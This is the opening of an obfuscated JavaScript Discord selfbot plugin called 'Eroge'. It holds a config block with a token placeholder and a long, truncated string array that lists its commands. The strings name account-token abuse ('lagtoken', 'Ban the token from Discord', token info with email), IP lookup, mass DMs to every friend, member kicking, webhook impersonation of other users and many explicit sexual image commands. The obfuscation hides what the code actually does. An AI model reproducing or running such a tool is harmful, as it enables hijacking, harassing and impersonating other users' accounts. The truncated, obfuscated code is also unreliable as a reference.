/**
 * @name Eroge
 * @author Misaki
 * @version 1.0.0
 * @description Eroge
 */

 var PREFIX = "+"
 var COLOR = "000000"
 var IMAGE = "https://media.tenor.com/images/cf23ebfe45a455b674bc094c3ca27d1b/tenor.gif"
 var RDM_NICKNAME = ["Misaki", "Misakiki", "<3"]
 var AFK_MESSAGE = "Sorry, i'm AFK"
 var MULTISTREAM = ["Misaki", "Multi", "STREAMING", "Eroge Plugins"]
 var RDM_BIO = ["Mmhmm yes", "I guess its working", "Or maybe nope", "Lets see"]
 var TOKEN = "ENTER YOUR TOKEN HERE"

const caritina = townsend;
function danella() {
  const chanston = ["text", "zip", "girlSolo", "symbols6", "727344hmUkjU", "girlstare", " 0123456789ꋫꃃꏸꁕꍟꄘꁍꑛꂑꀭꀗ꒒ꁒꁹꆂꉣꁸ꒓ꌚ꓅ꐇꏝꅐꇓꐟꁴꋫꃃꏸꁕꍟꄘꁍꑛꂑꀭꀗ꒒ꁒꁹꆂꉣꁸ꒓ꌚ꓅ꐇꏝꅐꇓꐟꁴ", "Auto Owoify Text mode enabled. ✅", "***Edit every message to a spoiler.***", "clean", "tits", "***Send a ascii of the cursed cat.***", "delete", "**🔞 Girl solo Picture 🔞**", "‎‎‎‎‎‎‎‎‎‎\n            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▄▄▄░░░░░\n            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░███▀█░░░░\n            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░███░██░░░\n            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░███░░██░░░\n            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░▄██░░░░██░░\n            ░░░░░░░░░░░░░░░░▄▄█▀▀▀▀█▄▄▄▄███▄░░░██░░\n            ░░░░░░░░░░░░░▄█▀░░░░░░░░░▀▀▀▀█░▀█░░██░░\n            ░░░░░░░░░░░░█▀░░░░░░░░░░░░░░░▀█▄█▀▀▀░░░\n            ░░░░░░░░░░░▄▀░░░░░░░░░░░░░░░░▀█▄░░░░░░░\n            ░░░░░░░░░░░▀█▄░█░░▄▀░░░░░░░▄▄█░░░░░░░░░\n            ░░░░░░░░▄▄▄▄█▀▀▀██▄▄░░░░░░▄▀░░░░░░░░░░░\n            ░░░░▄▄██▄▀▀░░░░░█▀░░░░░░▄██▄░░░░░░░░░░░\n            ░░▄██▀▀░░░░░░░░▄█░░░░░▄█▀▄█░▀▀█▄▄▄▄▄▄▄▄\n            ░██▀░░░░░░░░▄██░░░░░░▄▀▄▄▀░░░░░░░░░░░░░\n            █▀▀░░░░░░▄█▀▄░▀▄▄▄▄██▀▀▀░░░░░█░░░░░░░░░\n            █░░░░░▄▄▀░░░░█░░░░░░░░░░░░░░░▀░░░░░░░░░\n            ░▀▀▀▀▀▀░░░░░░░█░░░░░░░░░░░░░░░▀▀█▀▀▀▀▀▀\n            ░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░█▀░░░░░░\n            ░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░▄█░░░░░░░\n            ", "clean ```***", "***Underline your text.***", ' "mee6rank stop for stop it ✅', "height", "iphonex + URL ```***", "amogus ```**", "symbols12 ```**", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Sorry, you need use this commands in a server.", "hmidriff ```***", "guild", "```ID:```", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Multistreaming, do ", "This command work only in DM. ❌", "threats", "Token match ", "🔞 ***", "***> (°□°）>͡***", "https://i.imgur.com/LyGKoEN.jpg", "60%", "Auto Bold mode disabled. ❌", "***(′ʘ⌄ʘ‵)***", "***Random hthigh image***", "***Random image of Feet***", ".jpg?size=4096", "***Status commands 🍭***", "success", "trumptweet", "createWebhook", "***Symbol commands ღ***", "uuid", "trapnsfw", "📁 Servers", "░░░░░░░░░░ 0%", "kemonomimi ```***", "yuri", "「𝙈𝙚𝙣𝙪 𝙎𝙚𝙩𝙩𝙞𝙣𝙜𝙨」", "pat + MENTION ```***", "***Give the ownership to the user ID you want.***", "settings ```***", "femdom ```***", "girlsolo", ":middle_finger:", " have change ", "https://i.imgur.com/FwLP4uD.gif", "format", "\n> Theme: ", "snekfetch", "symbols4 ```**", " and ", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > NSFW commands list sent.", "Hentaii ", "random-puppy", "stopstream", "「𝙈𝙚𝙣𝙪 𝙃𝙚𝙡𝙥」", "***Send the image in an iphoneX***", "95%", "**🔞 Hmidriff Picture 🔞**", "feet", "**🔞 Pgif Picture 🔞**", "discriminator", "dickart", "**Token Info**", "symbols4", "***Send a image with kanna and your text***", ".png", "whentheimpostorissus ```**", "autoowoifytext", "catText", "girlexcited ```**", "timebio ```***", "toLocaleTimeString", "ownership + ID ```***", "***Autoresponse to DMs with a message***", "theme", "You need mention someone. ❌", "pingzdm + MENTION + TEXT ```**", "setlight ```***", "suicide ```***", "```Name:```", "No results found for **", "https://some-random-api.ml/pokedex?pokemon=", "hentaistatus", "cumarts", "yaoi ```***", "stopstream for reset the status", "Auto Yellow Text mode enabled. ✅", "url", "https://i.imgur.com/5ACuk6V.png", "***Random holo image***", "The tower has three levels for visitors, with restaurants on the first and second levels. The top level's upper platform is 276 m (906 ft) above the ground – the highest observation deck accessible to the public in the European Union. Tickets can be purchased to ascend by stairs or lift to the first and second levels. The climb from ground level to the first level is over 300 steps, as is the climb from the first level to the second. Although there is a staircase to the top level, it is usually accessible only by lift.", "info", "start", "***Random pussy image***", "autosmall", "👋 ", "978830qgcrAm", "***Fun commands 😂***", "‎‎‎‎‎‎‎‎‎‎\n                    ░█░█░█░█░█▀▀░█▀█                \n                    ░█▄█░█▀█░█▀▀░█░█                \n                    ░▀░▀░▀░▀░▀▀▀░▀░▀                \n                    ░▀█▀░█░█░█▀▀                    \n                    ░░█░░█▀█░█▀▀                    \n                    ░░▀░░▀░▀░▀▀▀                    \n                    ░▀█▀░█▄█░█▀█░█▀█░█▀▀░▀█▀░█▀█░█▀▄\n                    ░░█░░█░█░█▀▀░█░█░▀▀█░░█░░█░█░█▀▄\n                    ░▀▀▀░▀░▀░▀░░░▀▀▀░▀▀▀░░▀░░▀▀▀░▀░▀\n                    ░▀█▀░█▀▀                        \n                    ░░█░░▀▀█                        \n                    ░▀▀▀░▀▀▀                        \n                    ░█▀▀░█░█░█▀▀                    \n                    ░▀▀█░█░█░▀▀█                    \n                    ░▀▀▀░▀▀▀░▀▀▀                                                                             ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n                    ", "ready", "symbols6 ```**", "... ```**", "sex", "ass ```***", "adblock ```***", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Message send on DM to every friends.", "autocyan ```**", "https://i.imgur.com/Q89Z2vp.png", "***Trash the mentioned user into a anime girl :p***", "rdmnickname ```***", "magik + MENTION ```***", "triggered + MENTION ```***", "startsWith", "testlove + MENTION ```***", "fix", "fetchMessages", "You can try..", "https://twitch.tv/misakiii_", "pingzdm", "a6uny9jcMjet2W2LASruribq6VI", "request", "***Change your theme to light***", "***Ban the token from Discord***", "***Smug c:***", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Spotify status has been added.", "countdown ```***", "user", "anal", "symbols3 ```**", "pgif", "hentaistatus  ```***", "description", "username", "__proto__", "🤖 CPU", "85%", "gonewild ```***", "Auto Green Text mode enabled. ✅", "phone", "common", "autored", "👊 ", " ||", "mcskins", "__**Stats:**__", "***Random image of Yuri***", "testlove", "https://some-random-api.ml/animu/wink", "kicked with Eroge Plugin!", "speed", "***Get a notif when someone change his status (online, dnd, idle, offline)***", "femdom", "***Change your custom bio***", "girlstare ```**", "symbols9 ```**", "survey", "blurpify + MENTION ```***", "***[̲̅$̲̅(̲̅ιοο̲̅)̲̅$̲̅]***", "***Captcha members with his avatar***", "emoji_name", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Sorry, this command work only in server.", "reverse + TEXT ```**", "*** Survey made by ", "**🔞 Ass Picture 🔞**", "roles", "***Send a random sad cat image***", "setStartTimestamp", "smug", "loading", "***Random image of Lesbian***", "satisfied ```**", "captcha + MENTION + TEXT ```***", "deepfry", " ***", "OwO ```**", "nekobot-api", "token", "**🔞 Kemonomimi Picture 🔞**", "d.js-command-handler", "clientStatus", "***Funny custom trump tweet***", "symbols7 ```**", "getRpcImage", "Rpc", " has been kicked from the server.", "https://some-random-api.ml/canvas/triggered?avatar=", "You need enter a token. ❌", "usagePercent", "holoEro", "ship", "***Use a webhook to copy the member mentioned***", "search", "***", "‎‎‎‎‎‎‎‎‎‎\n                        ⠀⠀⣀\n                        ⠀⠿⣿⣿⣀\n                        ⠀⠉⣿⣿⣀\n                        ⠀⠀⠛⣿⣭⣀⣀⣤\n                        ⠀⠀⣿⣿⣿⣿⣿⠛⠿⣶⣀\n                        ⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⣉⣶\n                        ⠀⠀⠉⣿⣿⣿⣿⣀⠀⠀⣿⠉\n                        ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿\n                        ⠀⣀⣿⣿⣿⣿⣿⣿⣿⣿⠿\n                        ⠀⣿⣿⣿⠿⠉⣿⣿⣿⣿\n                        ⠀⣿⣿⠿⠀⠀⣿⣿⣿⣿\n                        ⣶⣿⣿⠀⠀⠀⠀⣿⣿⣿\n                        ⠛⣿⣿⣀⠀⠀⠀⣿⣿⣿⣿⣶⣀\n                        ⠀⣿⣿⠉⠀⠀⠀⠉⠉⠉⠛⠛⠿⣿⣶\n                        ⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿\n                        ⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉\n                        ⣀⣶⣿⠛\n                        ", "**🔞 Yaoi Picture 🔞**", "**「>> ", "changebio", "toDiscord", "***Random image of CumArts***", "📁 Friends", "moment-duration-format", " *** pat pat *** ", "***Random kemonomimi image***", "https://thumbs.gfycat.com/FlippantPettyAffenpinscher-size_restricted.gif", "holo", "country", "tweet + MENTION + TEXT ```***", "See status disabled. ❌", "gonewild", "‎‎‎‎‎‎‎‎‎‎\n                    ‎‎‎‎‎‎‎‎‎‎⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢠⣤⠈⢿⣿⡿⠋⠉⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n                    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠇⢸⣿⣷⠦⢀⣤⡚⠂⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n                    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⡾⠋⠀⢼⣥⡘⠃⣤⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n                    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⢀⣦⡄⠀⠀⠀⠉⠁⠀⣤⣄⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n                    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⢠⡾⠉⠃⠀⠀⠀⠠⣤⣰⣿⡗⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n                    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n                    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠟⠋⠀⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠛⠉⠙⠛⠿⢿⣿⣿⣿⣿⣿\n                    ⣿⣿⣿⣿⣿⣿⣿⠿⠛⠛⠁⠀⠀⢀⣀⡀⠤⠴⠲⣲⣿⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿\n                    ⣿⣿⣿⣿⡿⠋⠡⠀⠀⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠉⠉⠉⠉⠋⠁⠀⠀⠀⠀⠀⠠⠄⠙⢿⣿\n                    ⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿\n                    ⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⠄⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸\n                    ⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸\n                    ⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈\n                    ⡟⢠⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡄\n                    ⡇⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⠀⠀⢀⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇\n                    ⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⡸⠑⠀⠀⠀⢀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡟⠀⠀⠀⡀⠀⠀⠾⠛⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠃\n                    ⠃⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⡀⠀⠀⠈⠙⠓⠲⠀⠠⠄⠠⠴⠟⠒⠂⢀⡈⠁⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠀⠀⠀⠀⠀⠀⠀⠀⠀\n                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠙⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠈⠈⠄⠀⠀⠀⠀⠀⠀⠀⢠⠄⠀⠑⠀⠀⠀⠀⠀⠀⠀⢰\n                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡄⣿⣷⡀⠀⠀⠀⠀⠀⢀⠀⠐⠂⠤⠀⠐⠀⠀⣧⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸\n                    ⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡇⣿⣿⡇⠀⠞⠁⠂⠀⠀⠀⠠⠀⠠⠤⠀⠀⠀⡢⠀⠀⠀⠀⠀⠀⠀⡇⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸\n                    ⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⣿⣿⡇⠀⠲⢮⢀⠀⠀⠀⠀⠈⠤⠀⠄⠀⠀⡅⠀⠀⠀⠀⠀⡜⢡⠇⠰⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸\n                    ⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠣⡀⢹⣿⡇⠀⠓⡀⠀⠀⠀⠀⠀⠀⠀⠂⠒⠀⠀⠂⠀⠀⠀⠀⠀⠁⠸⠇⠀⡂⠀⠀⠀⠀⠀⠀⠀⠀⣾\n                    ⣿⣿⣦⠐⠀⠀⠀⠀⠀⠀⠀⠀⠳⣄⠙⠇⠸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠖⠀⠐⠁⠀⠀⠀⠀⠘⠀⠀⣀⠤⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿\n                    ⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢠⡆⠀⡀⠀⠀⠀⠀⠀⢀⣼⡋⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿\n                    ⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠈⠳⠿⠀⣼⡐⡄⠀⠀⠀⠀⠀⡀⢠⢂⣿⣷⡇⢠⠀⠀⠀⡐⠀⠀⣧⣤⠂⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿\n                    ⣿⣿⣿⣿⣿⣿⣤⡀⢠⠀⠀⠂⠀⠀⠀⢀⣿⡇⠸⢄⠀⠀⡠⠊⠀⢁⣾⣿⣿⡇⠸⠣⠀⠴⠅⠀⡄⡀⠁⠀⠀⠀⠀⠄⠀⣼⣿⣿⣿⣿\n                    ⣿⣿⣿⣿⣿⣿⣿⣿⡄⣤⣤⣤⣤⣾⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⢲⣷⡄⣠⣤⣄⡀⢀⣾⣿⣿⣿⣿⣿\n                    ⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣉⡿⣿⣿⣴⣿⣿⡀⠠⠀⠀⠀⢀⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⣀⣤⣼⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n                    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⣿⢿⣿⣿⣿⠇⠠⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n                    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠁⠀⣀⣤⣤⣭⣾⣿⣿⣿⣶⣶⣶⣶⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n                    ", "Sorry, you need to use this command in a server.", "hentai ```***", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > New image has been set:", "floor", "ero ```***", "Send your 🍑 on DM :3", "‎‎‎‎‎‎‎‎‎‎\n                        ⠀⠀⠀⣀⣶⣀\n                        ⠀⠀⠀⠒⣛⣭\n                        ⠀⠀⠀⣀⠿⣿⣶\n                        ⠀⣤⣿⠤⣭⣿⣿\n                        ⣤⣿⣿⣿⠛⣿⣿⠀⣀\n                        ⠀⣀⠤⣿⣿⣶⣤⣒⣛\n                        ⠉⠀⣀⣿⣿⣿⣿⣭⠉\n                        ⠀⠀⣭⣿⣿⠿⠿⣿\n                        ⠀⣶⣿⣿⠛⠀⣿⣿\n                        ⣤⣿⣿⠉⠤⣿⣿⠿\n                        ⣿⣿⠛⠀⠿⣿⣿\n                        ⣿⣿⣤⠀⣿⣿⠿\n                        ⠀⣿⣿⣶⠀⣿⣿⣶\n                        ⠀⠀⠛⣿⠀⠿⣿⣿\n                        ⠀⠀⠀⣉⣿⠀⣿⣿\n                        ⠀⠶⣶⠿⠛⠀⠉⣿\n                        ⠀⠀⠀⠀⠀⠀⣀⣿\n                        ⠀⠀⠀⠀⠀⣶⣿⠿\n                    ", "neko-love", "***Change your status to custom Spotify with your own img & text***", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Mics commands list sent.", "sex + MENTION ```***", "suicide", "**🔞 Lewd avatar Picture 🔞**", "lat", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Hypersquad ", "mod ```***", "kannagen + TEXT ```***", "hasPermission", "***Random image of Girl Solo***", "giveslap", "Humidity :", "fortnitedance ```**", "autoinfo ```**", "Auto Red Text mode enabled. ✅", "55650UAuCKY", "removebotdm", "‎‎‎‎‎‎‎‎‎‎\n                    ⣿⣿⣿⣿⠛⠛⠉⠄⠁⠄⠄⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿\n                    ⣿⣿⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⣿⣿⣿⣿⣿⣿\n                    ⣿⣿⡇⠄⠄⠄⠐⠄⠄⠄⠄⠄⠄⠄⠠⣿⣿⣿⣿⣿⣿\n                    ⣿⣿⡇⠄⢀⡀⠠⠃⡐⡀⠠⣶⠄⠄⢀⣿⣿⣿⣿⣿⣿\n                    ⣿⣿⣶⠄⠰⣤⣕⣿⣾⡇⠄⢛⠃⠄⢈⣿⣿⣿⣿⣿⣿\n                    ⣿⣿⣿⡇⢀⣻⠟⣻⣿⡇⠄⠧⠄⢀⣾⣿⣿⣿⣿⣿⣿\n                    ⣿⣿⣿⣟⢸⣻⣭⡙⢄⢀⠄⠄⠄⠈⢹⣯⣿⣿⣿⣿⣿\n                    ⣿⣿⣿⣭⣿⣿⣿⣧⢸⠄⠄⠄⠄⠄⠈⢸⣿⣿⣿⣿⣿\n                    ⣿⣿⣿⣼⣿⣿⣿⣽⠘⡄⠄⠄⠄⠄⢀⠸⣿⣿⣿⣿⣿\n                    ⡿⣿⣳⣿⣿⣿⣿⣿⠄⠓⠦⠤⠤⠤⠼⢸⣿⣿⣿⣿⣿\n                    ⡹⣧⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⢇⣓⣾⣿⣿⣿⣿⣿\n                    ⡞⣸⣿⣿⢏⣼⣶⣶⣶⣶⣤⣶⡤⠐⣿⣿⣿⣿⣿⣿⣿\n                    ⣯⣽⣛⠅⣾⣿⣿⣿⣿⣿⡽⣿⣧⡸⢿⣿⣿⣿⣿⣿⣿\n                    ⣿⣿⣿⡷⠹⠛⠉⠁⠄⠄⠄⠄⠄⠄⠐⠛⠻⣿⣿⣿⣿\n                    ⣿⣿⣿⠃⠄⠄⠄⠄⠄⣠⣤⣤⣤⡄⢤⣤⣤⣤⡘⠻⣿\n                    ⣿⣿⡟⠄⠄⣀⣤⣶⣿⣿⣿⣿⣿⣿⣆⢻⣿⣿⣿⡎⠝\n                    ⣿⡏⠄⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡎⣿⣿⣿⣿⠐\n                    ⣿⡏⣲⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⣿⣿⣿⡟⣼\n                    ⣿⡠⠜⣿⣿⣿⣿⣟⡛⠿⠿⠿⠿⠟⠃⠾⠿⢟⡋⢶⣿\n                    ⣿⣧⣄⠙⢿⣿⣿⣿⣿⣿⣷⣦⡀⢰⣾⣿⣿⡿⢣⣿⣿\n                    ⣿⣿⣿⠂⣷⣶⣬⣭⣭⣭⣭⣵⢰⣴⣤⣤⣶⡾⢐⣿⣿\n                    ⣿⣿⣿⣷⡘⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⢃⣼⣿⣿\n                    ", "\n> ID: ", "symbols12", "ass", "***The user cry now :(***", "Never!", "en-US", "survey + TEXT ```***", "***Search a skins minecraft***", "𝙀𝙧𝙤𝙜𝙚 𝙐𝙩𝙞𝙡𝙞𝙩𝙮", "https://cdn.discordapp.com/avatars/", "```Defense:```", "🤖 Arch", "**🔞 Futanari Picture 🔞**", "\n> Email: ", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Help commands list sent.", "seestatus ```***", "Remove Bot DM disabled. ❌", "***Random gonewild picture***", "```Abilities:```", "***Mics commands 🔨***", "node-fetch", "***Random kanna image***", "***Random thigh image***", "guilds", "https://i.imgur.com/x4CCpJi.jpg", "https://thumbs.gfycat.com/LikelyPertinentIslandwhistler-size_restricted.gif", "Auto Red Text mode disabled. ❌", "***Random image of Kuni***", "***Settings commands ⚙️***", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Your discord will be reloaded in a few seconds..", "You need enter a ID. ❌", "cumarts ```***", " ❤️", "constructor", "https://i.imgur.com/ib8y9o8.gif", "STREAMING", "***Who whould win ? mmhm idk ?***", "***Random ass image***", "rule34", "bind", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Hentai status has been added.", "isMemberMentioned", "removebotdm ```***", "tits ```***", "blurpify", "https://nekobot.xyz/api/imagegen?type=trumptweet&text=", "stop", "setColor", "&text=", "‎‎‎‎‎‎‎‎‎‎\n                        ⠀⠀⠀⠀⣀\n                        ⠀⠀⣶⣿⠿⠀⠀⠀⣀⠀⣤⣤\n                        ⠀⣶⣿⠀⠀⠀⠀⣿⣿⣿⠛⠛⠿⣤⣀\n                        ⣶⣿⣤⣤⣤⣤⣤⣿⣿⣿⣀⣤⣶⣭⣿⣶⣀\n                        ⠉⠉⠉⠛⠛⠿⣿⣿⣿⣿⣿⣿⣿⠛⠛⠿⠿\n                        ⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⠿\n                        ⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⣿\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⣭⣿⣿⣿⣿⣿\n                        ⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⣿⣿⣿⣿\n                        ⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⠿\n                        ⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⠿\n                        ⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿\n                        ⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⠛⠿⣿⣤\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⠀⠀⠀⣿⣿⣤\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⣶⣿⠛⠉\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⠀⠀⠉\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉\n                        ", "customstreaming", "An error has occurred.", 'Rainbow Roles started ✅ for stop it type " + prefix + "rainbowroles stop.', "lagtoken + TOKEN ```***", "⏳ Mem Usage", "100%", "**Looked Up IP:**", "messageDelete", "thigh", "status ```***", "symbols8", "**🔞 Paizuri Picture 🔞**", "'=͟͟͞͞( ✌°∀° )☛", "facepalm", "20%", "guildCreate", "friends", "hkitsune ```***", "online", "sfw", "RichEmbed", "***Edit every message to a small text.***", "Oops, look like a new update is available.", "***Random Hentai image***", "clyde", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Mod commands list sent.", "(ಠ_ಠ)", "pokedex + POKEMON NAME ```***", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Mee6 Rank has been stopped. ✅", "You need enter a application ID (create one on the discord developper). ❌", "▬▬▬▬▬▬🔘▬▬▬▬▬▬▬▬ ⇆　　◁　　❚❚　　▷　　↻", "Auto Yifive mode enabled. ✅", "BAN_MEMBERS", "***Deepfry the member mentionned***", "anal ```***", "whowouldwin + MENTION ```***", "off", "r34", "Skin `", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Fun commands list sent.", "insult", "&image=", "https://api.alexflipnote.dev/sadcat", "setAuthor", "temperature", "***Give a slap to the member***", "lewdavatar", "***Random image of Lewd Avatar***", "**🔞 Girl solo gif Picture 🔞**", "Calculate the possible loves for ", "\n> Avatar: ", " have ask the question: ", "35%", "**🔞 Lesbian Picture 🔞**", "lon", "autosmall ```**", "pussy ```***", "▬▬🔘▬▬▬▬▬▬▬▬▬▬▬▬ ⇆　　◁　　❚❚　　▷　　↻", "AFK mode enabled ✅", "awooify + MENTION ```***", "weight", "sendnude ```***", "post", "size", "Typing Notif DM mode enabled. ✅", "apply", "gasm", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Random Nickname started, do ", "symbols2 ```**", "content", 